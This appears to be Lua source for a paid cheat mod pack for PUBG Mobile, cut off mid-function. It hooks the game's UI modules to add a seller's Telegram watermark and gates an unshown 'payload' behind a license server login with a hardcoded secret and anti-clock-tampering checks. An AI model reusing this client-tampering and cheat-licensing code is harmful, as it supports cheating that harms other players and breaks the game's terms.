local require = require
local import = import
local isValid = slua.isValid

local VIP_SYSTEM_CONFIG = {
    BrandName = "VIP PAID MODS LUA PAK",
    Version = "4.6",
    PhoneStatsBranding = "VIPPAIDFROMYOURSELLER",
    WatermarkText = "TELEGRAM: @VIPPAIDFROMYOURSELLER",
    TelegramLink = "https://t.me/VIPPAIDFROMYOURSELLER",
    TelegramHandle = "@VIPPAIDFROMYOURSELLER",
    Owner = "@YourSeller",
    Developer = "@YourSeller",
    Community = "@VIPPAIDFROMYOURSELLER"
}

local AUTH_TELEGRAM_LINK = VIP_SYSTEM_CONFIG.TelegramLink

local function DetectBasePath()
    local pkgs = {
        "com.tencent.ig", "com.pubg.imobile", "com.pubg.krmobile",
        "com.vng.pubgmobile", "com.rekoo.pubg", "com.rekoo.pubgm"
    }
    for _, pkg in ipairs(pkgs) do
        local p = "/storage/emulated/0/Android/data/" .. pkg .. "/files/config.ini"
        local f = io.open(p, "r")
        if f then
            f:close()
            return "/storage/emulated/0/Android/data/" .. pkg .. "/files/"
        end
    end
    for _, pkg in ipairs(pkgs) do
        local p = "/storage/emulated/0/Android/data/" .. pkg .. "/files/UE4Game/"
        local f = io.open(p, "r")
        if f then
            f:close()
            return "/storage/emulated/0/Android/data/" .. pkg .. "/files/"
        end
    end
    return "/storage/emulated/0/Android/data/com.pubg.imobile/files/"
end

local BASE_PATH = DetectBasePath()

local function BrandPhoneStatsWidget(ui)
    if not ui or not ui.UIRoot or not ui.UIRoot.TextBlock_quality then return false end
    pcall(function()
        local brand = (VIP_SYSTEM_CONFIG and VIP_SYSTEM_CONFIG.PhoneStatsBranding) or "VIPPAIDFROMYOURSELLER"
        ui.UIRoot.TextBlock_quality:SetText(brand)
        local LC = import("LinearColor") or _G.FLinearColor
        local SC = import("SlateColor") or _G.FSlateColor
        if SC and LC then
            pcall(function() ui.UIRoot.TextBlock_quality:SetColorAndOpacity(SC(LC(1, 1, 1, 1))) end)
        end
        ui._vip_phone_branded = true
    end)
    return true
end

local function ApplyPhoneStatsBranding()
    local targetModules = {
        "GameLua.Mod.Library.Client.UI.IngamePhoneStateUI",
        "client.slua.umg.MainCity.Immersion.MainCity_IngameImmersion_UIBP",
        "MainCity_IngameImmersion_UIBP"
    }

    local function HookPhoneModule(modName)
        pcall(function()
            local mod = package.loaded[modName]
            if not mod then
                local ok, m = pcall(require, modName)
                if ok and m then mod = m end
            end
            local impl = mod and (mod.__inner_impl or mod)
            if impl and type(impl) == "table" and not impl._vip_phone_hooked then
                local origUpdate = impl.UpdateArtQualityUI
                impl.UpdateArtQualityUI = function(self, a, b)
                    if origUpdate then pcall(origUpdate, self, a, b) end
                    BrandPhoneStatsWidget(self)
                end

                local origInit = impl.InitUI
                impl.InitUI = function(self)
                    if origInit then pcall(origInit, self) end
                    BrandPhoneStatsWidget(self)
                end

                local origBattery = impl.TickRefreshBatteryInfo
                impl.TickRefreshBatteryInfo = function(self)
                    if origBattery then pcall(origBattery, self) end
                    if self._vip_phone_branded ~= true then
                        BrandPhoneStatsWidget(self)
                    end
                end

                impl._vip_phone_hooked = true
            end
        end)
    end

    for _, m in ipairs(targetModules) do
        HookPhoneModule(m)
    end

    pcall(function()
        local mgr = package.loaded["client.slua_ui_framework.manager"] or _G.UIManager
        if not mgr then
            local ok, m = pcall(require, "client.slua_ui_framework.manager")
            if ok and m then mgr = m end
        end
        if not mgr or not mgr.GetUI then return end

        local candidates = {}
        if mgr.UI_Config_InGame and mgr.UI_Config_InGame.PhoneStateUI then
            table.insert(candidates, mgr.GetUI(mgr.UI_Config_InGame.PhoneStateUI))
        end
        if mgr.UI_Config and mgr.UI_Config.MainCity_IngameImmersion_UIBP then
            table.insert(candidates, mgr.GetUI(mgr.UI_Config.MainCity_IngameImmersion_UIBP))
        end
        if mgr.GetConfigByKey then
            local c1 = mgr.GetConfigByKey("PhoneStateUI")
            if c1 then table.insert(candidates, mgr.GetUI(c1)) end
            local c2 = mgr.GetConfigByKey("MainCity_IngameImmersion_UIBP")
            if c2 then table.insert(candidates, mgr.GetUI(c2)) end
        end

        for _, ui in ipairs(candidates) do
            if ui then BrandPhoneStatsWidget(ui) end
        end
    end)
end
_G.ApplyPhoneStatsBranding = ApplyPhoneStatsBranding
pcall(ApplyPhoneStatsBranding)

local WATERMARK_WIDGET_BP = "/Game/UMG/UI_BP/Common/BaseComponent/CommonBaseComponent_TextButton_UIBP.CommonBaseComponent_TextButton_UIBP"
local _CreditWatermarkWidget = nil
local _CreditWatermarkTextWidget = nil

local function DestroyCreditWatermarkWidget()
    if _CreditWatermarkWidget and slua.isValid(_CreditWatermarkWidget) then
        pcall(function()
            if _CreditWatermarkWidget.RemoveFromParent then
                _CreditWatermarkWidget:RemoveFromParent()
            end
        end)
    end
    _CreditWatermarkWidget = nil
    _CreditWatermarkTextWidget = nil
end
_G.DestroyCreditWatermarkWidget = DestroyCreditWatermarkWidget

local function GetOrCreateCreditWatermarkWidget()
    if _CreditWatermarkWidget and slua.isValid(_CreditWatermarkWidget) and _CreditWatermarkTextWidget then
        local inViewport = false
        pcall(function()
            if _CreditWatermarkWidget.IsInViewport and _CreditWatermarkWidget:IsInViewport() then
                inViewport = true
            elseif _CreditWatermarkWidget.GetParent and _CreditWatermarkWidget:GetParent() then
                inViewport = true
            end
        end)
        if inViewport then
            return _CreditWatermarkWidget, _CreditWatermarkTextWidget
        else
            pcall(DestroyCreditWatermarkWidget)
        end
    end

    if not slua or not slua.loadUI then return nil, nil end

    local ok, btn = pcall(slua.loadUI, WATERMARK_WIDGET_BP)
    if not (ok and btn and slua.isValid(btn)) then return nil, nil end

    local attached = false
    pcall(function()
        local UIContainers = _G.UIContainers or package.loaded["client.slua.config.ClientMacros.UIContainers"]
        if not UIContainers then
            local okC, resC = pcall(require, "client.slua.config.ClientMacros.UIContainers")
            if okC then UIContainers = resC end
        end
        local hm = package.loaded["game_frontend_hud"] or (pcall(require, "game_frontend_hud") and require("game_frontend_hud"))
        if hm and hm.AddToContainer and UIContainers and UIContainers.Top then
            hm.AddToContainer(UIContainers.Top, btn, 100)
            attached = true
        end
    end)
    if not attached and btn.AddToViewport then
        pcall(btn.AddToViewport, btn, 100)
    end

    local node_root = btn.UIRoot or btn
    local textWidget = node_root.RichText_Content or btn.RichText_Content
    local bgImage = node_root.Image_BtnBg or btn.Image_BtnBg

    local ESlateVisibility = UEnums and UEnums.ESlateVisibility or (pcall(import, "ESlateVisibility") and import("ESlateVisibility")) or nil
    local hitVis = ESlateVisibility and (ESlateVisibility.SelfHitTestInvisible or ESlateVisibility.HitTestInvisible)

    if hitVis then
        if btn.SetWidgetVisibility then pcall(btn.SetWidgetVisibility, btn, hitVis)
        elseif btn.SetVisibility then pcall(btn.SetVisibility, btn, hitVis) end
        if textWidget then
            if textWidget.SetWidgetVisibility then pcall(textWidget.SetWidgetVisibility, textWidget, hitVis)
            elseif textWidget.SetVisibility then pcall(textWidget.SetVisibility, textWidget, hitVis) end
        end
    end

    if bgImage and ESlateVisibility then
        if bgImage.SetVisibility then pcall(bgImage.SetVisibility, bgImage, ESlateVisibility.Collapsed)
        elseif bgImage.SetWidgetVisibility then pcall(bgImage.SetWidgetVisibility, bgImage, ESlateVisibility.Collapsed) end
    end
    if btn.SetBackgroundColor then
        local LinearColor = (pcall(import, "LinearColor") and import("LinearColor")) or _G.FLinearColor
        pcall(btn.SetBackgroundColor, btn, (LinearColor and LinearColor(0, 0, 0, 0)) or { R = 0, G = 0, B = 0, A = 0 })
    end

    pcall(function()
        local FAnchors = _G.FAnchors or (pcall(import, "Anchors") and import("Anchors"))
        local FVector2D = _G.FVector2D or (pcall(import, "Vector2D") and import("Vector2D"))
        local WLL = pcall(import, "WidgetLayoutLibrary") and import("WidgetLayoutLibrary")
        if WLL and WLL.SlotAsCanvasSlot and FAnchors and FVector2D then
            local slot = WLL.SlotAsCanvasSlot(btn)
            if slot then
                if slot.SetAnchors then slot:SetAnchors(FAnchors(1.0, 1.0, 1.0, 1.0)) end
                if slot.SetAlignment then slot:SetAlignment(FVector2D(1.0, 1.0)) end
                if slot.SetPosition then slot:SetPosition(FVector2D(-20, -8)) end
                if slot.SetSize then slot:SetSize(FVector2D(350, 24)) end
            end
        end
    end)

    pcall(function()
        local FAnchors = _G.FAnchors or (pcall(import, "Anchors") and import("Anchors"))
        local FVector2D = _G.FVector2D or (pcall(import, "Vector2D") and import("Vector2D"))
        if btn.SetAnchorsInViewport and FAnchors then pcall(btn.SetAnchorsInViewport, btn, FAnchors(1.0, 1.0, 1.0, 1.0)) end
        if btn.SetAlignmentInViewport and FVector2D then pcall(btn.SetAlignmentInViewport, btn, FVector2D(1.0, 1.0)) end
        if btn.SetPositionInViewport and FVector2D then pcall(btn.SetPositionInViewport, btn, FVector2D(-20, -8), false) end
    end)

    local targetText = (VIP_SYSTEM_CONFIG and VIP_SYSTEM_CONFIG.WatermarkText) or "TG - @VIPPAIDFROMYOURSELLER"

    if textWidget then
        pcall(function()
            local fi = textWidget.Font
            if fi then
                fi.Size = 14
                textWidget:SetFont(fi)
            end
            local LinearColor = (pcall(import, "LinearColor") and import("LinearColor")) or _G.FLinearColor
            local SlateColor = (pcall(import, "SlateColor") and import("SlateColor")) or _G.FSlateColor
            local YELLOW_COLOR = (LinearColor and LinearColor(1.0, 0.85, 0.0, 1.0)) or { R = 1.0, G = 0.85, B = 0.0, A = 1.0 }
            if SlateColor and textWidget.SetColorAndOpacity then
                textWidget:SetColorAndOpacity(SlateColor(YELLOW_COLOR))
            end
            local FVector2D = _G.FVector2D or (pcall(import, "Vector2D") and import("Vector2D"))
            if textWidget.SetShadowOffset and FVector2D then
                textWidget:SetShadowOffset(FVector2D(1, 1))
            end
            if textWidget.SetShadowColorAndOpacity then
                textWidget:SetShadowColorAndOpacity((LinearColor and LinearColor(0, 0, 0, 0.9)) or { R = 0, G = 0, B = 0, A = 0.9 })
            end
            if textWidget.SetText then
                textWidget:SetText(targetText)
            end
        end)
    end

    _CreditWatermarkWidget = btn
    _CreditWatermarkTextWidget = textWidget
    return _CreditWatermarkWidget, _CreditWatermarkTextWidget
end
_G.GetOrCreateCreditWatermarkWidget = GetOrCreateCreditWatermarkWidget

local function EnsureCreditWatermarkActive()
    pcall(GetOrCreateCreditWatermarkWidget)
    local ticker = pcall(require, "common.time_ticker") and require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(1.0, function()
            pcall(GetOrCreateCreditWatermarkWidget)
        end)
    end
end
_G.EnsureCreditWatermarkActive = EnsureCreditWatermarkActive

local EPawnState   = import("EPawnState")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")

--=====================================================
-- 0.5. INSTANCE GUARD
-- ============================================================================
local INSTANCE_BUILD = "small-map-ready-v8"
local previousInstance = rawget(_G, "__SMALL_MAP_FIXED_INSTANCE")
if type(previousInstance) == "table" and previousInstance.build == INSTANCE_BUILD
    and previousInstance.characterClass ~= nil then
    if type(previousInstance.ResumeMaintenance) == "function" then
        pcall(previousInstance.ResumeMaintenance)
    end
    return previousInstance.characterClass
end
local CombinedInstance = {build = INSTANCE_BUILD}
_G.__SMALL_MAP_FIXED_INSTANCE = CombinedInstance

-- ============================================================================
-- 1. LICENSE CONFIG + CORE
-- ============================================================================
local YourSellerLicenseConfig = (function()
    return {
        url = 'https://venomkey.com/connect', game = 'PUBG',
        timeout = 10, clockSkew = 120, expiryPath = nil,
        manualExpiry = nil, tamperTolerance = 5,
        secret = 'Vm8Lk7Uj2JmsjCPVPVjrLa7zgfx3uz9E',
    }
end)()

local YourSellerLicenseCore = (function()
    local Primitives = (function()
        local floor, abs, max = math.floor, math.abs, math.max
        local byte, char, format = string.byte, string.char, string.format
        local U32 = 4294967296
        local AND, XOR = {}, {}
        for a = 0, 15 do for b = 0, 15 do
            local av, bv, both, different, place = a, b, 0, 0, 1
            for _ = 1, 4 do
                local x, y = av % 2, bv % 2
                if x == 1 and y == 1 then both = both + place end
                if x ~= y then different = different + place end
                av, bv, place = floor(av / 2), floor(bv / 2), place * 2
            end
            AND[a * 16 + b], XOR[a * 16 + b] = both, different
        end end
        local function bitop(a, b, lookup)
            local value, place = 0, 1
            for _ = 1, 8 do
                value = value + lookup[(a % 16) * 16 + b % 16] * place
                a, b, place = floor(a / 16), floor(b / 16), place * 16
            end
            return value
        end
        local function band(a, b) return bitop(a, b, AND) end
        local function bxor(a, b) return bitop(a, b, XOR) end
        local function rol(value, amount)
            local divisor = 2 ^ (32 - amount)
            return (value % divisor) * 2 ^ amount + floor(value / divisor)
        end
        local function little32(value)
            return char(value % 256, floor(value / 256) % 256,
                floor(value / 65536) % 256, floor(value / 16777216) % 256)
        end
        local K = {
            0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
            0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
            0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
            0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
            0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
            0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
            0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
            0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
        }
        local SHIFT = {7,12,17,22,5,9,14,20,4,11,16,23,6,10,15,21}
        local function md5_raw(input)
            assert(type(input) == "string", "MD5 input must be a string")
            local size = #input
            local message = input .. char(128) .. string.rep(char(0), (55 - size) % 64)
                .. little32((size * 8) % U32) .. little32(floor(size / 536870912))
            local h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
            local words = {}
            for offset = 1, #message, 64 do
                for j = 0, 15 do
                    local a, b, c, d = byte(message, offset + j * 4, offset + j * 4 + 3)
                    words[j] = a + b * 256 + c * 65536 + d * 16777216
                end
                local a, b, c, d = h0, h1, h2, h3
                for i = 0, 63 do
                    local f, g, shiftBase
                    if i < 16 then
                        f, g, shiftBase = band(b, c) + band(U32 - 1 - b, d), i, 0
                    elseif i < 32 then
                        f, g, shiftBase = band(d, b) + band(U32 - 1 - d, c), (5 * i + 1) % 16, 4
                    elseif i < 48 then
                        f, g, shiftBase = bxor(bxor(b, c), d), (3 * i + 5) % 16, 8
                    else
                        local bOrNotD = U32 - 1 - band(U32 - 1 - b, d)
                        f, g, shiftBase = bxor(c, bOrNotD), (7 * i) % 16, 12
                    end
                    local nextB = (b + rol((a + f + K[i + 1] + words[g]) % U32,
                        SHIFT[shiftBase + i % 4 + 1])) % U32
                    a, b, c, d = d, nextB, b, c
                end
                h0, h1, h2, h3 = (h0 + a) % U32, (h1 + b) % U32, (h2 + c) % U32, (h3 + d) % U32
            end
            return little32(h0) .. little32(h1) .. little32(h2) .. little32(h3)
        end
        local function hex(input)
            return (input:gsub(".", function(c) return format("%02x", byte(c)) end))
        end
        local function md5(input) return hex(md5_raw(input)) end
        local function form_encode(input)
            assert(type(input) == "string", "Form value must be a string")
            return (input:gsub("[^A-Za-z0-9%-%._~ ]", function(c)
                return format("%%%02X", byte(c)) end):gsub(" ", "+"))
        end
        local function constant_time_equal(a, b)
            if type(a) ~= "string" or type(b) ~= "string" then return false end
            local difference = abs(#a - #b)
            for i = 1, max(#a, #b) do
                difference = difference + abs((byte(a, i) or 0) - (byte(b, i) or 0))
            end
            return difference == 0
        end
        local function name_uuid(input)
            local digest = md5_raw(input)
            local h = hex(digest:sub(1,6) .. char(byte(digest,7) % 16 + 48)
                .. digest:sub(8,8) .. char(byte(digest,9) % 64 + 128) .. digest:sub(10))
            return h:sub(1,8) .. "-" .. h:sub(9,12) .. "-" .. h:sub(13,16)
                .. "-" .. h:sub(17,20) .. "-" .. h:sub(21,32)
        end
        return {md5 = md5, md5_raw = md5_raw, form_encode = form_encode,
                constant_time_equal = constant_time_equal, name_uuid = name_uuid}
    end)()

    local SESSION_KEY = '__YourSellerLicenseSession_v1'
    local function loadSession()
        local g = rawget(_G, SESSION_KEY)
        if type(g) ~= 'table' or g.authorized ~= true then return nil end
        if type(g.expiresAt) == 'number' and g.expiresAt <= os.time() then
            _G[SESSION_KEY] = nil; return nil
        end
        return g
    end
    local function saveSession(expiresAt)
        pcall(function()
            _G[SESSION_KEY] = {authorized = true, expiresAt = expiresAt, issuedAt = os.time()}
        end)
    end
    local function clearSession() pcall(function() _G[SESSION_KEY] = nil end) end

    local CreateLocalExpiry = (function()
        return function(cfg, wallReader)
            local E = {}
            local expiredText = 'Mod expired. DM @YourSeller for renewal.'
            local tamperText  = "Don't be over smart"
            local blockedMessage, blockedPhase
            local function finite(n)
                return type(n) == 'number' and n == n and n ~= math.huge and n ~= -math.huge
            end
            local function parse(text)
                if type(text) ~= 'string' then return nil end
                local y,m,d,h,n,s = text:match('^(%d%d%d%d)%-(%d%d)%-(%d%d) (%d%d):(%d%d):(%d%d)$')
                y,m,d,h,n,s = tonumber(y),tonumber(m),tonumber(d),tonumber(h),tonumber(n),tonumber(s)
                if not y or y < 1970 or y > 9999 or m < 1 or m > 12 or h > 23 or n > 59 or s > 59 then return nil end
                local leap = y % 4 == 0 and (y % 100 ~= 0 or y % 400 == 0)
                local months = {31, leap and 29 or 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}
                if d < 1 or d > months[m] then return nil end
                local prior = y - 1
                local days = 365 * (y - 1970) + math.floor(prior / 4) - math.floor(1969 / 4)
                    - math.floor(prior / 100) + math.floor(1969 / 100)
                    + math.floor(prior / 400) - math.floor(1969 / 400)
                for i = 1, m - 1 do days = days + months[i] end
                return (days + d - 1) * 86400 + h * 3600 + n * 60 + s - 6 * 3600
            end
            local configured = type(cfg.manualExpiry) == 'string'
                and cfg.manualExpiry:match('^%s*(.-)%s*$') or cfg.manualExpiry
            local expiry = parse(configured)
            local skew = cfg.clockSkew or 120
            if configured ~= nil and configured ~= '' and not expiry then
                blockedMessage, blockedPhase = 'Invalid local expiry date. Use YYYY-MM-DD HH:MM:SS.', 'error'
            end
            local function block(message, phase)
                if not blockedMessage then blockedMessage, blockedPhase = message, phase end
                return false, blockedMessage, blockedPhase
            end
            function E.Status() return not blockedMessage, blockedMessage, blockedPhase end
            function E.MarkTampered() return block(tamperText, 'tampered') end
            function E.GetExpiry() return expiry end
            function E.Accept(server, now, world, phone, rtt)
                if blockedMessage then return E.Status() end
                if not finite(server) or not finite(now) or now < 0 or world == nil
                    or not finite(rtt) or rtt < 0 or not finite(phone) then
                    return block('Clock verification unavailable.', 'error')
                end
                if math.abs(phone - server) > skew + rtt then return E.MarkTampered() end
                if expiry and server + rtt >= expiry then return block(expiredText, 'expired') end
                return true
            end
            return E
        end
    end)()

    local CreateAuth = (function()
        return function(P, cfg, deps)
            local A = {}
            local phase, message = 'locked', 'Enter your key to sign in.'
            local allowed, pending, generation = false, nil, 0
            local expiresAt
            local lastRequestLatencyMs, lastResponseTime, lastResponseWorld
            local startFn, stopFn, payloadStarted, restartRequired
            local localExpiry = deps.localExpiry
            do
                local stored = loadSession()
                if stored then
                    allowed = true; expiresAt = stored.expiresAt
                    phase, message = 'active', 'Session restored'
                end
            end
            if localExpiry then
                local ok, text, state = localExpiry.Status()
                if not ok then message, phase = text, state end
            end
            local function finite(n)
                return type(n) == 'number' and n == n and n ~= math.huge and n ~= -math.huge
            end
            local function readClock()
                local ok, n, w = pcall(deps.clock)
                if ok and finite(n) and n >= 0 and w ~= nil then return n, w end
            end
            local function notify(text, state)
                message, phase = text, state
                if type(deps.status) == 'function' then pcall(deps.status, text, state) end
            end
            local function stopPayload()
                if payloadStarted then
                    payloadStarted = false
                    local ok, accepted = pcall(stopFn)
                    if not ok or accepted == false then restartRequired = true end
                end
            end
            local function revoke(text, state)
                generation = generation + 1
                allowed, pending, expiresAt = false, nil, nil
                lastRequestLatencyMs, lastResponseTime, lastResponseWorld = nil, nil, nil
                stopPayload()
                local localDenied = false
                if localExpiry then
                    local ok, localText, localPhase = localExpiry.Status()
                    if not ok then text, state, localDenied = localText, localPhase, true end
                end
                notify(restartRequired and not localDenied
                    and 'Restart required: payload cleanup failed.' or text, state or 'error')
            end
            local function startPayload()
                if payloadStarted or not startFn then return true end
                payloadStarted = true
                local before = generation
                local ok, accepted = pcall(startFn)
                if not ok or accepted == false then
                    restartRequired = true
                    revoke('Restart required: offline script startup failed.', 'error')
                    return false
                end
                return generation == before and allowed
            end
            local function denyReason(reason)
                if type(reason) ~= 'string' then return 'Expired' end
                local lower = reason:sub(1, 120):lower():gsub('[_%s%-]+', ' ')
                if lower == 'max devices' or lower == 'maximum devices'
                    or lower == 'max devices reached' then
                    return 'Max Devices'
                end
                local clean = reason
                for _, field in ipairs({'key', 'serial'}) do
                    if pending and type(pending[field]) == 'string' and #pending[field] > 0 then
                        local needle = pending[field]:gsub('([^%w])', '%%%1')
                        clean = clean:gsub(needle, '[' .. field .. ']')
                    end
                end
                if type(cfg.secret) == 'string' and #cfg.secret > 0 then
                    clean = clean:gsub(cfg.secret:gsub('([^%w])', '%%%1'), '[credential]')
                end
                clean = clean:gsub('[%c]', ' '):sub(1, 120)
                return clean == '' and 'Expired' or ('Expired: ' .. clean)
            end
            local function configuredExpiry(result)
                if cfg.expiryPath == nil then return nil, true end
                if type(cfg.expiryPath) ~= 'table' or #cfg.expiryPath == 0 then return nil, false end
                local v = result
                for _, name in ipairs(cfg.expiryPath) do
                    if type(v) ~= 'table' then return nil, false end
                    v = rawget(v, name)
                end
                return v, finite(v) and v > 0 and v % 1 == 0
            end
            local function begin(key)
                if restartRequired or pending then return false end
                if localExpiry then
                    local ok, text, state = localExpiry.Status()
                    if not ok then revoke(text, state); return false end
                end
                if type(key) ~= 'string' then key = '' end
                key = key:match('^%s*(.-)%s*$')
                if #key == 0 or #key > 512 then
                    revoke('Expired: enter a valid key.', 'denied'); return false
                end
                local now, world = readClock()
                if not now then
                    revoke('Game clock unavailable. Try again in a match.', 'error'); return false
                end
                local okSerial, serial = pcall(deps.serial, key)
                if not okSerial or type(serial) ~= 'string' or #serial == 0 or #serial > 512 then
                    revoke('Device identifier unavailable.', 'error'); return false
                end
                generation = generation + 1
                local requestId = generation
                pending = {id = requestId, key = key, serial = serial,
                           started = now, world = world, deadline = now + cfg.timeout}
                notify('Signing in...', 'pending')
                if not pending or pending.id ~= requestId or generation ~= requestId then return false end
                local body = 'game=' .. P.form_encode(cfg.game)
                    .. '&user_key=' .. P.form_encode(key)
                    .. '&serial=' .. P.form_encode(serial)
                local function received(success, raw)
                    if not pending or pending.id ~= requestId or generation ~= requestId then return end
                    local current, worldNow = readClock()
                    if not current or worldNow ~= pending.world or current < pending.started
                        or current >= pending.deadline then
                        revoke('Request expired. Please sign in again.', 'error'); return
                    end
                    if success ~= true or type(raw) ~= 'string' or #raw == 0 or #raw > 32768 then
                        revoke('Connection failed. Please try again.', 'error'); return
                    end
                    local ok, result = pcall(deps.decode, raw)
                    if not ok or type(result) ~= 'table' then
                        revoke('Invalid server response.', 'error'); return
                    end
                    if result.status ~= true then revoke(denyReason(result.reason), 'denied'); return end
                    local data = result.data
                    if type(data) ~= 'table' or type(data.token) ~= 'string' or #data.token ~= 32
                        or not data.token:match('^[%x]+$') or not finite(data.rng) or data.rng % 1 ~= 0 then
                        revoke('Incomplete server response.', 'error'); return
                    end
                    local expected = P.md5(cfg.game .. '-' .. key .. '-' .. serial .. '-' .. cfg.secret)
                    if not P.constant_time_equal(data.token:lower(), expected) then
                        revoke('Server token verification failed.', 'denied'); return
                    end
                    local okWall, wall = pcall(deps.wall)
                    if not okWall or not finite(wall) then
                        revoke('Phone clock unavailable.', 'error'); return
                    end
                    if localExpiry then
                        local accepted, text, state = localExpiry.Accept(
                            data.rng, current, worldNow, wall, current - pending.started)
                        if not accepted then revoke(text, state); return end
                    elseif math.abs(wall - data.rng) > cfg.clockSkew then
                        revoke('Phone/server clock mismatch. Check automatic time.', 'error'); return
                    end
                    local expiry, validExpiry = configuredExpiry(result)
                    if not validExpiry then
                        revoke('Configured server expiry field is missing or invalid.', 'error'); return
                    end
                    if expiry and expiry - data.rng - (current - pending.started) <= 0 then
                        revoke('Expired', 'denied'); return
                    end
                    local fixedExpiry = localExpiry and localExpiry.GetExpiry()
                    if fixedExpiry then expiry = math.min(expiry or fixedExpiry, fixedExpiry) end
                    lastRequestLatencyMs = (current - pending.started) * 1000
                    lastResponseTime, lastResponseWorld = current, worldNow
                    pending = nil
                    allowed, expiresAt = true, expiry
                    saveSession(expiresAt)
                    if not startPayload() then return end
                    notify('Login successful.', 'active')
                end
                local ok, accepted = pcall(deps.post, cfg.url,
                    {['Content-Type'] = 'application/x-www-form-urlencoded'},
                    body, received, cfg.timeout)
                if not ok or accepted == false then
                    revoke('HTTP request could not start.', 'error'); return false
                end
                return true
            end
            function A.Login(key) if allowed then return false end; return begin(key) end
            function A.Tick()
                if not pending then return end
                local now, world = readClock()
                if not now or world ~= pending.world or now < pending.started then
                    revoke('Login interrupted by map loading. Please try again when ready.', 'locked'); return
                end
                if now >= pending.deadline then
                    revoke('Request timed out. Please try again.', 'error')
                end
            end
            function A.IsAuthorized()
                if allowed and not restartRequired then return true end
                local stored = loadSession()
                if stored and not restartRequired then
                    allowed = true; expiresAt = stored.expiresAt; return true
                end
                return false
            end
            function A.Logout() clearSession(); revoke('Expired: signed out.', 'locked') end
            function A.FailClosed(text, requiresRestart)
                if requiresRestart == true then restartRequired = true end
                revoke(text or 'Online access unavailable.', 'error')
            end
            function A.ReportClockTampering()
                if localExpiry then localExpiry.MarkTampered() end
                revoke("Don't be over smart", 'tampered')
            end
            function A.Bind(onStart, onStop)
                if type(onStart) ~= 'function' or type(onStop) ~= 'function' then
                    return false, 'START_AND_STOP_REQUIRED'
                end
                if startFn and (startFn ~= onStart or stopFn ~= onStop) then
                    return false, 'ALREADY_BOUND'
                end
                startFn, stopFn = onStart, onStop
                if A.IsAuthorized() then return startPayload() end
                return true
            end
            function A.Unbind()
                revoke('Offline script disconnected.', 'locked')
                startFn, stopFn = nil, nil
            end
            function A.GetRemainingSeconds() return nil end
            function A.GetState()
                local authorized = A.IsAuthorized()
                local sample, age
                if authorized and lastRequestLatencyMs ~= nil then
                    local now, world = readClock()
                    if now and world == lastResponseWorld and now >= lastResponseTime then
                        sample, age = lastRequestLatencyMs, now - lastResponseTime
                    end
                end
                return {
                    phase = phase, message = message, authorized = authorized,
                    sessionAuthorized = authorized, expiresAt = expiresAt,
                    accessPolicy = "game_session", expiryCheckPolicy = "login_only",
                    periodicRecheck = false, pending = pending ~= nil,
                    linked = startFn ~= nil, restartRequired = restartRequired == true,
                    lastRequestLatencyMs = sample, lastRequestLatencyAgeSeconds = age,
                    latencyScope = "license_http_round_trip"
                }
            end
            return A
        end
    end)()

    local Core = {Primitives = Primitives, createExpiry = CreateLocalExpiry}
    function Core.new(config, dependencies)
        assert(type(config) == 'table' and type(dependencies) == 'table',
            'License configuration and dependencies required')
        local deps = {}
        for key, value in pairs(dependencies) do deps[key] = value end
        if deps.localExpiry == nil then deps.localExpiry = CreateLocalExpiry(config, deps.wall) end
        return CreateAuth(Primitives, config, deps)
    end
    return Core
end)()

-- ============================================================================
-- 2. LOGIN UI  (unchanged)
-- ============================================================================
local YourSellerLoginUI = (function()
    local Module = {}
    function Module.new(env)
        env = env or _G
        local require = env.require or require
        local function global(name)
            local ok, value = pcall(function() return env[name] end)
            if ok then return value end
        end
        local UI = {_status = "Enter your key", _busy = false, _data = nil}
        local function member(object, name)
            if object == nil then return nil end
            local ok, value = pcall(function() return object[name] end)
            if ok then return value end
        end
        local function valid(object)
            local check = member(global("slua"), "isValid")
            if object == nil then return false end
            if type(check) == 'function' then
                local ok, result = pcall(check, object)
                if ok and result == true then return true end
            end
            local game = global('Game')
            local fallback = member(game, 'IsValid')
            if type(fallback) == 'function' then
                local ok, result = pcall(fallback, game, object)
                return ok and result == true
            end
            return false
        end
        local function imported(name)
            local loader = global("import")
            if type(loader) ~= "function" then return nil end
            local ok, result = pcall(loader, name)
            if ok then return result end
        end
        local function construct(class, ...)
            if class == nil then return nil end
            local ok, result = pcall(class, ...)
            if ok then return result end
        end
        local function vector(x, y)
            return construct(global("FVector2D") or imported("Vector2D"), x, y)
                or {X = x, Y = y}
        end
        local function color(r, g, b, a)
            return construct(global("FLinearColor") or imported("LinearColor"), r, g, b, a)
                or {R = r, G = g, B = b, A = a}
        end
        local function visibility(widget, value)
            local setter = member(widget, "SetWidgetVisibility") or member(widget, "SetVisibility")
            assert(type(setter) == "function", "UI_VISIBILITY_UNAVAILABLE")
            setter(widget, value)
        end
        local function setTextStyle(widget, size, textColor)
            pcall(function()
                local font = widget.Font
                if font then
                    font.Size = math.max(1, math.floor(size * (UI._scale or 1) + 0.5))
                    local assigned = pcall(function() widget.Font = font end)
                    if not assigned then widget:SetFont(font) end
                end
            end)
            pcall(function() widget:SetAutoWrapText(true) end)
            pcall(function()
                local slate = construct(imported("SlateColor"), textColor)
                if slate then widget:SetColorAndOpacity(slate) end
            end)
        end
        local function detach(data)
            if not data then return end
            data.visible = false
            pcall(function() if valid(data.input) then data.input:SetText("") end end)
